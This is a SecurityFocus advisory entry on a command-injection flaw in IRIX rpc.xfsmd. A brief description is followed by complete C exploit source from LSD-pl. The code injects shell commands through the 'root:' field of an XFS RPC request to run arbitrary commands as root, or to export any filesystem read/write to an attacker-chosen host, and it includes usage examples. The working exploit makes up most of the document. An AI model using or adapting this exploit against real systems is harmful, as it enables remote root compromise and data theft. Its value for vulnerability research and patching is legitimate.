source: http://www.securityfocus.com/bid/5075/info

Throghout the implementation of the supported remote procedure calls, the server uses the popen() libc function. When popen() is used, arguments passed to the RPC are included in the command string. These arguments are not sanitized. If shell metacharacters, such as ";" and "|" are embedded in the remotely supplied arguments, additional commands may be executed. These commands will run with root privileges.

/*## copyright LAST STAGE OF DELIRIUM Sep 1999 poland        *://lsd-pl.net/ #*/
/*## xfsmd                                                                   #*/

/*   this code forces xfsmd to execute any command on remote IRIX host or     */
/*   to export any file system from it with read/write privileges.            */
/*   the exploit requires that DNS is properly configured on an attacked      */
/*   host. additionally, if the file systems are to be exported from a        */
/*   vulnerable system, it must have NFS subsystem running.                   */

/*   example usage:                                                           */
/*   xfsmd address -c "touch /etc/lsd"                                        */
/*     (executes "touch /etc/lsd" command as root user on a vulnerable host)  */
/*   xfsmd address -e 10.0.0.1 -d "/"                                         */
/*     (exports / filesystem to the 10.0.0.1 host with rw privileges)         */ 

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

#define XFS_PROG    391016
#define XFS_VERS    1     
#define XFS_EXPORT  13

typedef char *req_t;
typedef struct{char *str1;int errno;}res_t;

bool_t xdr_req(XDR *xdrs,req_t *objp){
    if(!xdr_string(xdrs,objp,~0)) return(FALSE);
    return(TRUE);
}

bool_t xdr_res(XDR *xdrs,res_t *objp){
    if(!xdr_string(xdrs,&objp->str1,~0)) return(FALSE);
    if(!xdr_int(xdrs,&objp->errno)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char command[10000],*h,*cmd,*hst=NULL,*dir="/etc";
    int i,port=0,flag=0,c;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;
    res_t res;

    printf("copyright LAST STAGE OF DELIRIUM Sep 1999 poland  //lsd-pl.net/\n");
    printf("rpc.xfsmd for irix 6.2 6.3 6.4 6.5 6.5.16 IP:all\n\n");

    if(argc<3){
        printf("usage: %s address -c \"command\" [-p port]\n",argv[0]);
        printf("       %s address -e address [-d dir] [-p port]\n",argv[0]);
        exit(-1);
    }
    while((c=getopt(argc-1,&argv[1],"c:p:e:d:"))!=-1){
	 switch(c){
	 case 'c': flag=0;cmd=optarg;break;
         case 'e': flag=1;hst=optarg;break;
         case 'd': dir=optarg;break;
         case 'p': port=atoi(optarg);
	 }
    }

    req=command;
    if(!flag){
        printf("executing %s command... ",cmd);
        sprintf(req,"XFS_MNT_DIR:/tmp\nroot:;%s;",cmd);
    }else{
        printf("exporting %s directory to %s... ",dir,hst);
        sprintf(req,"XFS_FS_NAME:%s\nroot:%s\n",dir,hst);
    }

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }else{
        if((hp=gethostbyaddr((char*)&adr.sin_addr.s_addr,4,AF_INET))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
    }
    if((h=(char*)strchr(hp->h_name,'.'))!=NULL) *(h+1)=0;
    else strcat(hp->h_name,".");

    i=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&adr,XFS_PROG,XFS_VERS,&i,0,0))){
        clnt_pcreateerror("error");exit(-1);
    }

    cl->cl_auth=authunix_create(hp->h_name,0,0,0,NULL);
    stat=clnt_call(cl,XFS_EXPORT,xdr_req,(void*)&req,xdr_res,(void*)&res,tm);
    if(stat!=RPC_SUCCESS) {clnt_perror(cl,"error");exit(-1);}
    printf("%s\n",(!flag)?"ok":((!res.errno)?"ok":"failed"));
}